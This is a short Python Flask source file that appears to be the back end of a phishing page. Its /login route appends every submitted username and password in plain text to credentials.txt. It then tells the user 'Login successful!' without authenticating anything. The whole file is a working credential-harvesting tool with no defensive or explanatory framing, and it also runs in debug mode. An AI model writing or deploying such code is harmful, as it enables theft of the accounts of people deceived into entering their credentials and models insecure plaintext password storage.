from flask import Flask, request, render_template

app = Flask(__name__, template_folder='html_files')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return 'Login successful!'

if __name__ == '__main__':
    app.run(debug=True)